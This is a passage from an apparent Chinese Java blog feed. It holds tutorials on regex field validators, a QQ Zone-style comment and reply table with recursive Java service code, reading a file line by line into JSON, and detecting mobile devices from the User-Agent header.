判断字段是否为INTEGER 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isInteger( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, INTEGER ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为正整数正则表达式 &gt;=0 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isINTEGER_NEGATIVE( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, INTEGER_NEGATIVE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为负整数正则表达式 &lt;=0 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isINTEGER_POSITIVE( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, INTEGER_POSITIVE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为DOUBLE 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isDouble( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, DOUBLE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为正浮点数正则表达式 &gt;=0 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isDOUBLE_NEGATIVE( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, DOUBLE_NEGATIVE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为负浮点数正则表达式 &lt;=0 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isDOUBLE_POSITIVE( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, DOUBLE_POSITIVE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为日期 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isDate( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, DATE_ALL ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为年龄 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isAge( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, AGE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否超长</span><br><span class="line"> * 字串为空返回fasle, 超过长度&#123;leng&#125;返回ture 反之返回false</span><br><span class="line"> * @param str</span><br><span class="line"> * @param leng</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isLengOut( String str, int leng )</span><br><span class="line">	&#123;</span><br><span class="line">		return(StrisNull( str ) ? false : str.trim().length() &gt; leng);</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为身份证 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isIdCard( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( StrisNull( str ) )</span><br><span class="line">			return(false);</span><br><span class="line">		if ( str.trim().length() == 15 || str.trim().length() == 18 )</span><br><span class="line">		&#123;</span><br><span class="line">			return(Regular( str, IDCARD ) );</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			return(false);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为邮编 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isCode( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, CODE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字符串是不是全部是汉字</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isChina( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, STR_CHINA ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字符串是不是全部是英文字母</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isEnglish( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, STR_ENG ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字符串是不是全部是英文字母+数字</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isENG_NUM( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, STR_ENG_NUM ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字符串是不是全部是英文字母+数字+下划线</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isENG_NUM_( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, STR_ENG_NUM_ ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 过滤特殊字符串 返回过滤后的字符串</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static String filterStr( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		Pattern p	= Pattern.compile( STR_SPECIAL );</span><br><span class="line">		Matcher m	= p.matcher( str );</span><br><span class="line">		return(m.replaceAll( &quot;&quot; ).trim() );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 匹配是否符合正则表达式pattern 匹配返回true</span><br><span class="line"> * @param str 匹配的字符串</span><br><span class="line"> * @param pattern 匹配模式</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	private static boolean Regular( String str, String pattern )</span><br><span class="line">	&#123;</span><br><span class="line">		System.out.println( &quot;pattern=&quot; + pattern );</span><br><span class="line">		if ( null == str || str.trim().length() &lt;= 0 )</span><br><span class="line">			return(false);</span><br><span class="line">		Pattern p	= Pattern.compile( pattern );</span><br><span class="line">		Matcher m	= p.matcher( str );</span><br><span class="line">		return(m.matches() );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断是不是科学计数法 如果是 返回true</span><br><span class="line"> * 匹配科学计数 e或者E必须出现有且只有一次 结尾不含D</span><br><span class="line"> * 匹配模式可参考本类定义的 SCIENTIFIC_A，SCIENTIFIC_B,SCIENTIFIC_C,SCIENTIFIC_D</span><br><span class="line"> * 若判断为其他模式可调用 Regular(String str,String pattern)方法</span><br><span class="line"> * @param str 科学计数字符串</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isScientific( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( StrisNull( str ) )</span><br><span class="line">			return(false);</span><br><span class="line">		return(Regular( str, validate.SCIENTIFIC_A ) );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[模仿qq空间评论以及回复]]></title>
      <url>/2014/qqzone-comment-reply/</url>
      <content type="html"><![CDATA[<p>本篇文章讲解如何模仿qq空间评论以及回复代码实现和表结构的设计</p>
<p>先看需求是怎么样的：</p>
<a id="more"></a>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fknwp6uyeyj20ei0anwfo.jpg" alt=""></p>
<p>再看评论表结构的设计：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_comment</span><br><span class="line">(</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">32</span>) primary <span class="keyword">key</span>, #主键<span class="keyword">Id</span></span><br><span class="line">  customer_id <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="literal">null</span>, #用户<span class="keyword">Id</span></span><br><span class="line">  parent_comment_id <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="literal">null</span>, #父评论<span class="keyword">Id</span></span><br><span class="line">  content_id <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="literal">null</span>, #评论对象的<span class="keyword">Id</span></span><br><span class="line">  <span class="keyword">type</span> <span class="built_in">int</span>(<span class="number">11</span>), #评论对象的类型</span><br><span class="line">  <span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">140</span>) <span class="literal">null</span>, #评论内容</span><br><span class="line">  comment_date <span class="built_in">varchar</span>(<span class="number">10</span>) <span class="literal">null</span>, #评论日期</span><br><span class="line">  comment_time <span class="built_in">varchar</span>(<span class="number">12</span>) <span class="literal">null</span>, #评论时间</span><br><span class="line">  state <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">null</span> #评论的状态 <span class="number">0</span>显示或者<span class="number">1</span>不显示</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>在看实体的设计：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String id;<span class="comment">// id</span></span><br><span class="line">	<span class="keyword">private</span> String customerId;<span class="comment">// 用户id</span></span><br><span class="line">	<span class="keyword">private</span> String parentCommentId;<span class="comment">// 父评论id</span></span><br><span class="line">	<span class="keyword">private</span> String contentId;<span class="comment">// 内容id</span></span><br><span class="line">	<span class="keyword">private</span> String content;<span class="comment">// 评论内容</span></span><br><span class="line">	<span class="keyword">private</span> String commetDate;<span class="comment">// 评论日期</span></span><br><span class="line">	<span class="keyword">private</span> String commetTime;<span class="comment">// 评论时间</span></span><br><span class="line">	<span class="keyword">private</span> Integer state;<span class="comment">// 评论的状态</span></span><br><span class="line">	<span class="keyword">private</span> Integer type;<span class="comment">// 评论类型</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//=================================</span></span><br><span class="line">	<span class="keyword">private</span> List&lt;Comment&gt; replyComment; <span class="comment">// 评论回复信息</span></span><br><span class="line">	<span class="keyword">private</span> Customer customer;<span class="comment">// 评论者信息</span></span><br><span class="line">	<span class="keyword">private</span> Customer replyCustomer; <span class="comment">// 回复评论的人</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 省略了getter/setter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析问题的解决方案，我先说说我解决问题的方案：</p>
<p>首先根据我们要评论的对象得Id，查询出评论该对象的所有父评论；</p>
<p>然后根据父评论的Id去查询子评论的信息。</p>
<p>分析完毕后：我们开始写sql：</p>
<p>下面的t_item 为评论对象中的一种类型， 他的类型码为1 所有tco.type = 1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> tco.* <span class="keyword">FROM</span> t_comment tco </span><br><span class="line">	<span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t_item tit <span class="keyword">ON</span> tco.content_id = tit.id</span><br><span class="line">	<span class="keyword">WHERE</span> tco.parent_comment_id <span class="keyword">IS</span> <span class="literal">NULL</span></span><br><span class="line">	<span class="keyword">AND</span> tco.type = <span class="number">1</span></span><br><span class="line">	<span class="keyword">AND</span> comment.state = <span class="number">0</span></span><br><span class="line">	<span class="keyword">AND</span> tit.id = #&#123;itemId&#125;</span><br><span class="line">	<span class="keyword">ORDER</span> <span class="keyword">BY</span> tco.comment_date <span class="keyword">DESC</span>, tco.comment_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>
<p>以上为查询所有的父评论信息；</p>
<p>然后我们再根据父评论的Id查询子评论的信息：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> tco.* <span class="keyword">FROM</span> t_comment tco </span><br><span class="line">	<span class="keyword">WHERE</span> tco.parent_comment_id = #&#123;parentCommentId&#125; </span><br><span class="line">	<span class="keyword">AND</span> comment.state = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>以上是查询子评论的信息</p>
<p>通过上面的sql，我们只是简单的查询了语句：</p>
<p>我们在看看java中怎么去构建评论的集合</p>
<p>dao的编写：就是把以上的两个sql语句变成两个方法。</p>
<p>根据评论对象的Id查询所有父评论：List\<comment\> findParentCommentByItemId(String itemId, int offset, int limit);</comment\></p>
<p>根据父评论的Id查询所有子评论：List\<comment\> findReplyCommentByCommentId(String parentCommentId, int offset, int limit);</comment\></p>
<p>然后我们看service怎么实现：</p>
<p>根据评论对象的Id查询所有评论：List\<comment\> findCommentByItemId(String itemId, int offset, int limit);</comment\></p>
<p>具体的实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">findCommentByItemId</span><span class="params">(String itemId, <span class="keyword">int</span> offset, <span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">		List&lt;Comment&gt; comments = commentDao.findParentCommentByItemId(itemId, offset, limit);</span><br><span class="line">		<span class="keyword">for</span>(Comment comment : comments)&#123;</span><br><span class="line">			List&lt;Comment&gt; replys = <span class="keyword">new</span> ArrayList&lt;Comment&gt;(); <span class="comment">// 实例化回复的集合</span></span><br><span class="line">			comment.setReplyComment(replys); <span class="comment">// 设置评论的回复集合</span></span><br><span class="line">			String customerId = comment.getCustomerId(); <span class="comment">// 获取评论的人的Id</span></span><br><span class="line">			Customer customer = customerService.getCustomerByCustomerId(customerId); <span class="comment">// 通过评论人的Id获取评论人的信息</span></span><br><span class="line">			<span class="keyword">if</span>(customer != <span class="keyword">null</span>) customer.setPassword(<span class="keyword">null</span>); <span class="comment">// 把评论的人的密码设置为空</span></span><br><span class="line">			comment.setCustomer(customer); <span class="comment">// 设置评论的人的信息</span></span><br><span class="line">			buildReplyComment(comment, replys, offset, limit); <span class="comment">// 构建评论与回复信息</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> comments;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 构建评论与回复评论的关系</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> comment</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> offset</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> limit</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildReplyComment</span><span class="params">(Comment comment, List&lt;Comment&gt; replys, <span class="keyword">int</span> offset, <span class="keyword">int</span> limit)</span></span>&#123;</span><br><span class="line">		List&lt;Comment&gt; replyComments = commentDao.findReplyCommentByCommentId(comment.getId(), offset, limit); <span class="comment">// 获取评论的所有回复</span></span><br><span class="line">		replys.addAll(replyComments); <span class="comment">// 把所有的回复添加到评论实例化的回复集合中</span></span><br><span class="line">		<span class="keyword">for</span>(Comment c : replyComments)&#123; <span class="comment">// 遍历回复中的回复</span></span><br><span class="line">			String customerId = c.getCustomerId(); <span class="comment">// 获取回复人的id</span></span><br><span class="line">			Customer replyCustomer = customerService.getCustomerByCustomerId(customerId); <span class="comment">// 获取回复人信息</span></span><br><span class="line">			<span class="keyword">if</span>(replyCustomer != <span class="keyword">null</span>) replyCustomer.setPassword(<span class="keyword">null</span>); <span class="comment">// 把回复人的密码设置为空</span></span><br><span class="line">			Customer customer = customerService.getCustomerByCustomerId(comment.getCustomerId()); <span class="comment">// 获取评论人的信息</span></span><br><span class="line">			c.setCustomer(customer); <span class="comment">// 设置评论人的信息</span></span><br><span class="line">			c.setReplyCustomer(replyCustomer); <span class="comment">// 设置回复人的信息</span></span><br><span class="line">			buildReplyComment(c, replys, offset, limit); <span class="comment">// 递归调用</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>最后看页面的展示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;c:forEach var=<span class="string">"comment"</span> items=<span class="string">"$&#123;itemComments&#125;"</span>&gt;</span><br><span class="line">&lt;c:out value=<span class="string">"$&#123;comment.customer.nickName&#125;"</span>/&gt;:</span><br><span class="line">&lt;span class="ellipsis"&gt;$&#123;comment.content&#125;&lt;/span&gt;</span><br><span class="line">&lt;span class="ellipsis"&gt;(&lt;c:out value="$&#123;comment.commetDate&#125;" /&gt;)&lt;/span&gt;</span><br><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">"$&#123;!empty comment.replyComment&#125;"</span>&gt;</span><br><span class="line">&lt;c:forEach var=<span class="string">"reply"</span> items=<span class="string">"$&#123;comment.replyComment&#125;"</span>&gt;</span><br><span class="line">$&#123;reply.replyCustomer.nickName&#125;回复了$&#123;reply.customer.nickName&#125;</span><br><span class="line">&lt;span class="ellipsis"&gt;$&#123;reply.content&#125;&lt;/span&gt;</span><br><span class="line">&lt;span class="ellipsis"&gt;(&lt;c:out value="$&#123;comment.commetDate&#125;" /&gt;)&lt;/span&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br><span class="line">&lt;/c:if&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure>
<p>样式方面需要调整，大体的功能就这个样子了，</p>
<p>还有不足请指出来，谢谢</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 设计 </tag>
            
            <tag> sql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java 文件读取，一行一行的读取]]></title>
      <url>/2014/java-readline/</url>
      <content type="html"><![CDATA[<p>这篇文章让我们来看看java是如何一行行读取文件的</p>
<p>看代码：</p>
<a id="more"></a>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		File file = <span class="keyword">new</span> File(<span class="string">"c:/error.txt"</span>);</span><br><span class="line">		FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">		InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(fis);</span><br><span class="line">		BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">		JsonObject json = <span class="keyword">new</span> JsonObject();</span><br><span class="line">		String readoneline = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">while</span>((readoneline = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">			String[] lines = readoneline.split(<span class="string">"\\-"</span>);</span><br><span class="line">			json.addProperty(lines[<span class="number">0</span>], lines[<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		br.close();</span><br><span class="line">		isr.close();</span><br><span class="line">		fis.close();</span><br><span class="line">		File errorJson = <span class="keyword">new</span> File(<span class="string">"c:/errorJson.txt"</span>);</span><br><span class="line">		<span class="keyword">if</span>(!errorJson.exists()) errorJson.mkdir();</span><br><span class="line">		FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(errorJson);</span><br><span class="line">		fos.write(json.toString().getBytes());</span><br><span class="line">		fos.close();</span><br><span class="line">		System.out.println(<span class="string">"OK..."</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>主要解决的问题是：把文件中的有对应格式的字符串，转换成json字符串的文件</p>
<p>核心代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String readoneline = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">while</span>((readoneline = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">	String[] lines = readoneline.split(<span class="string">"\\-"</span>);</span><br><span class="line">	json.addProperty(lines[<span class="number">0</span>], lines[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java 获取设备信息]]></title>
      <url>/2014/java-get-device-name/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 java 获取设备信息</p>
<p>// \b 是单词边界(连着的两个(字母字符 与 非字母字符) 之间的逻辑上的间隔),<br>// 字符串在编译时会被转码一次,所以是 “\b”<br>// \B 是单词内部逻辑间隔(连着的两个字母字符之间的逻辑上的间隔)<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">static String phoneReg = &quot;\\b(ip(hone|od)|android|opera m(ob|in)i&quot; + &quot;|windows (phone|ce)|blackberry&quot; + &quot;|s(ymbian|eries60|amsung)|p(laybook|alm|rofile/midp&quot;</span><br><span class="line">			 + &quot;|laystation portable)|nokia|fennec|htc[-_]&quot; + &quot;|mobile|up.browser|[1-4][0-9]&#123;2&#125;x[1-4][0-9]&#123;2&#125;)\\b&quot;;</span><br><span class="line">static String tableReg = &quot;\\b(ipad|tablet|(Nexus 7)|up.browser&quot; + &quot;|[1-4][0-9]&#123;2&#125;x[1-4][0-9]&#123;2&#125;)\\b&quot;;</span><br><span class="line">/* 移动设备正则匹配：手机端、平板 */</span><br><span class="line">static Pattern	phonePat	= Pattern.compile( phoneReg, Pattern.CASE_INSENSITIVE );</span><br><span class="line">static Pattern	tablePat	= Pattern.compile( tableReg, Pattern.CASE_INSENSITIVE );</span><br><span class="line">/**</span><br><span class="line"> * 检测是否是移动设备访问</span><br><span class="line"> *</span><br><span class="line"> * @Title: check</span><br><span class="line"> * @Date : 2014-7-7 下午01:29:07</span><br><span class="line"> * @param userAgent</span><br><span class="line"> * 浏览器标识</span><br><span class="line"> * @return true:移动设备接入，false:pc端接入</span><br><span class="line"> */</span><br><span class="line">protected boolean check( String userAgent )</span><br><span class="line">&#123;</span><br><span class="line">	if ( null == userAgent )</span><br><span class="line">	&#123;</span><br><span class="line">		userAgent = &quot;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">/* 匹配 */</span><br><span class="line">	Matcher matcherPhone	= phonePat.matcher( userAgent );</span><br><span class="line">	Matcher matcherTable	= tablePat.matcher( userAgent );</span><br><span class="line">	if ( matcherPhone.find() || matcherTable.find() )</span><br><span class="line">	&#123;</span><br><span class="line">		return(true);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		return(false);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * 获取设备名称</span><br><span class="line"> * @param userAgent</span><br><span class="line"> * @return</span><br><span class="line"> */</span><br><span class="line">protected String getDeviceName( String userAgent )</span><br><span class="line">&#123;</span><br><span class="line">	if ( null == userAgent )</span><br><span class="line">	&#123;</span><br><span class="line">		userAgent = &quot;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">/* 匹配 */</span><br><span class="line">	Matcher matcherPhone	= phonePat.matcher( userAgent );</span><br><span class="line">	Matcher matcherTable	= tablePat.matcher( userAgent );</span><br><span class="line">	if ( matcherPhone.find() )</span><br><span class="line">	&#123;</span><br><span class="line">		return(matcherPhone.group() );</span><br><span class="line">	&#125; else if ( matcherTable.find() )</span><br><span class="line">	&#123;</span><br><span class="line">		return(matcherTable.group() );</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		return(&quot;pc&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">String	ua		= request.getHeader( &quot;User-Agent&quot; ).toLowerCase();</span><br><span class="line">String	deviceType	= this.check( ua ) ? &quot;mobile&quot; : &quot;pc&quot;;</span><br><span class="line">String	deviceName	= this.getDeviceName( ua );</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 设备 </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[html5 audio读取文件流播放音频]]></title>
      <url>/2014/html5-audio-file-stream-play/</url>
      <content type="html"><![CDATA[<p>最近要解决一个html5 播放音频的问题，在前台地址中不能直接写服务器中的音频文件地址。</p>
<p>在java中使用的springmvc来解决问题，先配置好springmvc的环境，拦截*.mp3的请求，写controller方法</p>
<a id="more"></a>
